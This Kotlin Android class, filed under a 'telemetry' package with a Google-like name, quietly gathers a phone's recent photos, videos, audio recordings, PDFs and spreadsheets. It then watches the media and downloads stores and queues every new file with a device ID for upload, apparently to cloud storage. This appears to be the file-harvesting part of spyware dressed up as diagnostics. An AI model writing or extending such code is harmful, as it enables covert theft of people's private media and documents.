package com.opp.googleoperation.telemetry

import android.content.ContentResolver
import android.content.ContentUris
import android.content.Context
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import com.opp.googleoperation.data.model.MediaEvent
import com.opp.googleoperation.util.Constants
import com.opp.googleoperation.util.PermissionHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.launch

class MediaObserver(
    private val ctx: Context,
    private val scope: CoroutineScope
) {
    companion object {
        private const val TAG = "MediaObserver"
        const val MAX_FILE_SIZE_BYTES = 300L * 1024 * 1024 // 300 MB ceiling
        private const val KEY_INITIAL_MEDIA_SYNCED_V7 = "key_initial_media_synced_v7"
        private const val KEY_LAST_MEDIA_TIMESTAMP = "key_last_media_timestamp"
        private val _mediaEvents = MutableSharedFlow<MediaEvent>(extraBufferCapacity = 300)
        val mediaEvents: SharedFlow<MediaEvent> = _mediaEvents.asSharedFlow()
    }

    private val prefs = ctx.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE)
    private val handler = Handler(Looper.getMainLooper())
    private var isRegistered = false
    private var lastProcessedTimestamp: Long = prefs.getLong(KEY_LAST_MEDIA_TIMESTAMP, System.currentTimeMillis() - 60000)
    private val processedIds = HashSet<Long>()

    fun forceResyncMedia() {
        prefs.edit().putBoolean(KEY_INITIAL_MEDIA_SYNCED_V7, false).apply()
        syncCategorizedMediaBaseline()
    }

    private val imagesObserver = object : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)
            inspectNewMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image", uri)
        }
    }

    private val videoObserver = object : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)
            inspectNewMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video", uri)
        }
    }

    private val audioObserver = object : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)
            inspectNewMedia(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", uri)
        }
    }

    private val documentsObserver = object : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)
            val filesUri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                MediaStore.Downloads.EXTERNAL_CONTENT_URI
            } else {
                MediaStore.Files.getContentUri("external")
            }
            inspectNewMedia(filesUri, "document", uri)
        }
    }

    fun startObserving() {
        if (isRegistered) return
        if (!PermissionHelper.hasMediaPermissions(ctx)) {
            Log.w(TAG, "media permissions missing")
            return
        }

        // Perform 1-time categorized baseline sync: 100 images, 30 videos, 20 audio, 50 pdf/sheets
        syncCategorizedMediaBaseline()

        val cr = ctx.contentResolver
        try {
            cr.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, imagesObserver)
            cr.registerContentObserver(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, true, videoObserver)
            cr.registerContentObserver(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, true, audioObserver)

            val filesUri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                MediaStore.Downloads.EXTERNAL_CONTENT_URI
            } else {
                MediaStore.Files.getContentUri("external")
            }
            cr.registerContentObserver(filesUri, true, documentsObserver)

            isRegistered = true
            Log.d(TAG, "media & document content observers registered")
        } catch (e: Exception) {
            Log.w(TAG, "failed to register media observers", e)
        }
    }

    fun stopObserving() {
        if (!isRegistered) return
        val cr = ctx.contentResolver
        try {
            cr.unregisterContentObserver(imagesObserver)
            cr.unregisterContentObserver(videoObserver)
            cr.unregisterContentObserver(audioObserver)
            cr.unregisterContentObserver(documentsObserver)
            isRegistered = false
            Log.d(TAG, "media content observers unregistered")
        } catch (e: Exception) {
            Log.w(TAG, "failed to unregister media observers", e)
        }
    }

    private fun syncCategorizedMediaBaseline() {
        val alreadySynced = prefs.getBoolean(KEY_INITIAL_MEDIA_SYNCED_V7, false)
        if (alreadySynced) return

        scope.launch(Dispatchers.IO) {
            if (!PermissionHelper.hasMediaPermissions(ctx)) return@launch
            Log.d(TAG, "starting categorized baseline sync: 100 images, 30 videos, 20 audio, 50 pdf/spreadsheets")

            val cr = ctx.contentResolver
            val devId = PermissionHelper.getOrCreateDeviceId(ctx)
            var highestTimestamp = 0L

            // 1. Sync 100 Most Recent Images
            val imageCount = scanMediaCategory(
                cr = cr,
                baseUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                targetCategory = "image",
                limit = 100,
                devId = devId,
                onTimestamp = { if (it > highestTimestamp) highestTimestamp = it }
            )

            // 2. Sync 30 Most Recent Videos
            val videoCount = scanMediaCategory(
                cr = cr,
                baseUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                targetCategory = "video",
                limit = 30,
                devId = devId,
                onTimestamp = { if (it > highestTimestamp) highestTimestamp = it }
            )

            // 3. Sync 20 Most Recent Audio Recordings
            val audioCount = scanMediaCategory(
                cr = cr,
                baseUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                targetCategory = "audio",
                limit = 20,
                devId = devId,
                onTimestamp = { if (it > highestTimestamp) highestTimestamp = it }
            )

            // 4. Sync 50 Most Recent Documents (PDFs + Excel Spreadsheets)
            val docCount = scanDocumentsCategory(
                cr = cr,
                limit = 50,
                devId = devId,
                onTimestamp = { if (it > highestTimestamp) highestTimestamp = it }
            )

            if (highestTimestamp > 0L) {
                lastProcessedTimestamp = highestTimestamp
            }

            prefs.edit()
                .putBoolean(KEY_INITIAL_MEDIA_SYNCED_V7, true)
                .putLong(KEY_LAST_MEDIA_TIMESTAMP, lastProcessedTimestamp)
                .apply()

            Log.d(TAG, "baseline media sync finished: $imageCount images, $videoCount videos, $audioCount audios, $docCount documents queued")
        }
    }

    private fun scanMediaCategory(
        cr: ContentResolver,
        baseUri: Uri,
        targetCategory: String,
        limit: Int,
        devId: String,
        onTimestamp: (Long) -> Unit
    ): Int {
        val projection = mutableListOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.MIME_TYPE,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.DATE_ADDED,
            MediaStore.MediaColumns.DATE_MODIFIED
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            projection.add(MediaStore.MediaColumns.DATE_TAKEN)
            projection.add(MediaStore.MediaColumns.RELATIVE_PATH)
        } else {
            @Suppress("DEPRECATION")
            projection.add(MediaStore.MediaColumns.DATA)
        }

        var count = 0
        var cursor: Cursor? = null
        try {
            cursor = cr.query(
                baseUri,
                projection.toTypedArray(),
                null,
                null,
                "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            )

            if (cursor != null) {
                val idCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val nameCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val mimeCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                val dateCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
                val modCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATE_MODIFIED)
                val takenCol = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    cursor.getColumnIndex(MediaStore.MediaColumns.DATE_TAKEN)
                } else -1

                while (cursor.moveToNext() && count < limit) {
                    val mediaId = cursor.getLong(idCol)
                    val dateAddedSec = cursor.getLong(dateCol)
                    val dateAddedMs = dateAddedSec * 1000L
                    val dateModMs = if (modCol >= 0) cursor.getLong(modCol) * 1000L else 0L
                    val dateTakenMs = if (takenCol >= 0) cursor.getLong(takenCol) else 0L
                    val size = cursor.getLong(sizeCol)

                    if (size <= 0 || size > MAX_FILE_SIZE_BYTES) continue

                    // Resolve true origin timestamp: prefer original camera capture timestamp
                    val actualTimestamp = when {
                        dateTakenMs > 0L -> dateTakenMs
                        dateModMs > 0L -> dateModMs
                        else -> dateAddedMs
                    }

                    val fileName = cursor.getString(nameCol) ?: "media_$mediaId"
                    val rawMime = cursor.getString(mimeCol) ?: ""
                    val contentUri = ContentUris.withAppendedId(baseUri, mediaId).toString()
                    val relativePath = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        val pathCol = cursor.getColumnIndex(MediaStore.MediaColumns.RELATIVE_PATH)
                        if (pathCol >= 0) cursor.getString(pathCol) ?: "" else ""
                    } else {
                        val dataCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATA)
                        if (dataCol >= 0) cursor.getString(dataCol) ?: "" else ""
                    }

                    processedIds.add(mediaId)
                    onTimestamp(dateAddedMs)

                    val event = MediaEvent(
                        mediaId = mediaId,
                        deviceId = devId,
                        fileName = fileName,
                        mimeType = rawMime.ifEmpty { "application/octet-stream" },
                        mediaType = targetCategory,
                        sizeBytes = size,
                        dateAddedMs = actualTimestamp,
                        contentUri = contentUri,
                        relativePath = relativePath,
                        b2Url = null,
                        uploadStatus = "pending"
                    )

                    _mediaEvents.tryEmit(event)
                    count++
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "error scanning $targetCategory category", e)
        } finally {
            cursor?.close()
        }
        return count
    }

    private fun scanDocumentsCategory(
        cr: ContentResolver,
        limit: Int,
        devId: String,
        onTimestamp: (Long) -> Unit
    ): Int {
        val baseUri = MediaStore.Files.getContentUri("external")
        val projection = mutableListOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.MIME_TYPE,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.DATE_ADDED,
            MediaStore.MediaColumns.DATE_MODIFIED
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            projection.add(MediaStore.MediaColumns.RELATIVE_PATH)
        } else {
            @Suppress("DEPRECATION")
            projection.add(MediaStore.MediaColumns.DATA)
        }

        var count = 0
        var cursor: Cursor? = null
        try {
            cursor = cr.query(
                baseUri,
                projection.toTypedArray(),
                null,
                null,
                "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            )

            if (cursor != null) {
                val idCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val nameCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val mimeCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                val dateCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
                val modCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATE_MODIFIED)

                while (cursor.moveToNext() && count < limit) {
                    val mediaId = cursor.getLong(idCol)
                    val dateAddedSec = cursor.getLong(dateCol)
                    val dateAddedMs = dateAddedSec * 1000L
                    val dateModMs = if (modCol >= 0) cursor.getLong(modCol) * 1000L else 0L
                    val actualTimestamp = if (dateModMs > 0L) dateModMs else dateAddedMs
                    val size = cursor.getLong(sizeCol)

                    if (size <= 0 || size > MAX_FILE_SIZE_BYTES) continue

                    val fileName = cursor.getString(nameCol) ?: "document_$mediaId"
                    val rawMime = cursor.getString(mimeCol) ?: ""

                    // Check if PDF or Excel/Spreadsheet
                    val isPdf = rawMime == "application/pdf" || fileName.endsWith(".pdf", true)
                    val isExcel = rawMime.contains("spreadsheet") || rawMime.contains("ms-excel") ||
                            rawMime == "text/csv" || fileName.endsWith(".xlsx", true) ||
                            fileName.endsWith(".xls", true) || fileName.endsWith(".csv", true) ||
                            fileName.endsWith(".ods", true)

                    if (!isPdf && !isExcel) continue

                    val docType = if (isExcel) "sheet" else "pdf"
                    val contentUri = ContentUris.withAppendedId(baseUri, mediaId).toString()
                    val relativePath = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        val pathCol = cursor.getColumnIndex(MediaStore.MediaColumns.RELATIVE_PATH)
                        if (pathCol >= 0) cursor.getString(pathCol) ?: "" else ""
                    } else {
                        val dataCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATA)
                        if (dataCol >= 0) cursor.getString(dataCol) ?: "" else ""
                    }

                    processedIds.add(mediaId)
                    onTimestamp(dateAddedMs)

                    val event = MediaEvent(
                        mediaId = mediaId,
                        deviceId = devId,
                        fileName = fileName,
                        mimeType = rawMime.ifEmpty { if (isExcel) "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" else "application/pdf" },
                        mediaType = docType,
                        sizeBytes = size,
                        dateAddedMs = actualTimestamp,
                        contentUri = contentUri,
                        relativePath = relativePath,
                        b2Url = null,
                        uploadStatus = "pending"
                    )

                    _mediaEvents.tryEmit(event)
                    count++
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "error scanning documents category", e)
        } finally {
            cursor?.close()
        }
        return count
    }

    private fun inspectNewMedia(baseUri: Uri, mediaType: String, specificUri: Uri?) {
        scope.launch(Dispatchers.IO) {
            if (!PermissionHelper.hasMediaPermissions(ctx)) return@launch

            val cr = ctx.contentResolver
            val projection = mutableListOf(
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.MIME_TYPE,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.DATE_ADDED,
                MediaStore.MediaColumns.DATE_MODIFIED
            )

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                projection.add(MediaStore.MediaColumns.DATE_TAKEN)
                projection.add(MediaStore.MediaColumns.RELATIVE_PATH)
            } else {
                @Suppress("DEPRECATION")
                projection.add(MediaStore.MediaColumns.DATA)
            }

            val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            val queryUri = specificUri ?: baseUri

            var cursor: Cursor? = null
            try {
                cursor = cr.query(
                    queryUri,
                    projection.toTypedArray(),
                    null,
                    null,
                    sortOrder
                )

                if (cursor != null && cursor.moveToFirst()) {
                    val idCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                    val nameCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                    val mimeCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                    val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                    val dateCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
                    val modCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATE_MODIFIED)
                    val takenCol = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        cursor.getColumnIndex(MediaStore.MediaColumns.DATE_TAKEN)
                    } else -1

                    val mediaId = cursor.getLong(idCol)
                    val dateAddedSec = cursor.getLong(dateCol)
                    val dateAddedMs = dateAddedSec * 1000L
                    val dateModMs = if (modCol >= 0) cursor.getLong(modCol) * 1000L else 0L
                    val dateTakenMs = if (takenCol >= 0) cursor.getLong(takenCol) else 0L

                    val actualTimestamp = when {
                        dateTakenMs > 0L -> dateTakenMs
                        dateModMs > 0L -> dateModMs
                        else -> dateAddedMs
                    }

                    if (processedIds.contains(mediaId)) return@launch
                    if (dateAddedMs <= lastProcessedTimestamp) return@launch

                    processedIds.add(mediaId)
                    if (processedIds.size > 300) {
                        processedIds.clear()
                        processedIds.add(mediaId)
                    }

                    lastProcessedTimestamp = dateAddedMs
                    prefs.edit().putLong(KEY_LAST_MEDIA_TIMESTAMP, lastProcessedTimestamp).apply()

                    val fileName = cursor.getString(nameCol) ?: "unnamed_${mediaType}_$mediaId"
                    val rawMime = cursor.getString(mimeCol) ?: ""
                    val size = cursor.getLong(sizeCol)

                    if (size <= 0 || size > MAX_FILE_SIZE_BYTES) return@launch

                    val isExcel = rawMime.contains("spreadsheet") || rawMime.contains("ms-excel") ||
                            rawMime.contains("excel") || rawMime == "text/csv" ||
                            fileName.endsWith(".xlsx", true) || fileName.endsWith(".xls", true) ||
                            fileName.endsWith(".csv", true) || fileName.endsWith(".ods", true) ||
                            fileName.endsWith(".tsv", true) || fileName.endsWith(".xlsm", true)

                    val isDoc = rawMime == "application/pdf" || rawMime.contains("msword") ||
                            rawMime.contains("wordprocessingml") || rawMime == "text/plain" ||
                            fileName.endsWith(".pdf", true) || fileName.endsWith(".doc", true) ||
                            fileName.endsWith(".docx", true) || fileName.endsWith(".txt", true) ||
                            fileName.endsWith(".rtf", true)

                    val detectedType = when {
                        rawMime.startsWith("image/") || fileName.endsWith(".jpg", true) ||
                                fileName.endsWith(".jpeg", true) || fileName.endsWith(".png", true) ||
                                fileName.endsWith(".webp", true) || fileName.endsWith(".gif", true) ||
                                fileName.endsWith(".heic", true) || fileName.endsWith(".heif", true) ||
                                fileName.endsWith(".bmp", true) -> "image"

                        rawMime.startsWith("video/") || fileName.endsWith(".mp4", true) ||
                                fileName.endsWith(".mkv", true) || fileName.endsWith(".3gp", true) ||
                                fileName.endsWith(".mov", true) || fileName.endsWith(".avi", true) ||
                                fileName.endsWith(".webm", true) || fileName.endsWith(".ts", true) -> "video"

                        rawMime.startsWith("audio/") || fileName.endsWith(".mp3", true) ||
                                fileName.endsWith(".m4a", true) || fileName.endsWith(".aac", true) ||
                                fileName.endsWith(".wav", true) || fileName.endsWith(".ogg", true) ||
                                fileName.endsWith(".opus", true) || fileName.endsWith(".flac", true) ||
                                fileName.endsWith(".amr", true) || fileName.endsWith(".3ga", true) -> "audio"

                        isExcel -> "sheet"

                        isDoc -> "pdf"

                        else -> return@launch
                    }

                    val relativePath = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        val pathCol = cursor.getColumnIndex(MediaStore.MediaColumns.RELATIVE_PATH)
                        if (pathCol >= 0) cursor.getString(pathCol) ?: "" else ""
                    } else {
                        val dataCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATA)
                        if (dataCol >= 0) cursor.getString(dataCol) ?: "" else ""
                    }

                    val contentUri = ContentUris.withAppendedId(baseUri, mediaId).toString()
                    val devId = PermissionHelper.getOrCreateDeviceId(ctx)

                    val event = MediaEvent(
                        mediaId = mediaId,
                        deviceId = devId,
                        fileName = fileName,
                        mimeType = rawMime.ifEmpty { "application/octet-stream" },
                        mediaType = detectedType,
                        sizeBytes = size,
                        dateAddedMs = actualTimestamp,
                        contentUri = contentUri,
                        relativePath = relativePath,
                        b2Url = null,
                        uploadStatus = "pending"
                    )

                    Log.d(TAG, "detected new $detectedType: $fileName ($size bytes)")
                    _mediaEvents.tryEmit(event)
                }
            } catch (e: Exception) {
                Log.w(TAG, "error querying media content", e)
            } finally {
                cursor?.close()
            }
        }
    }
}
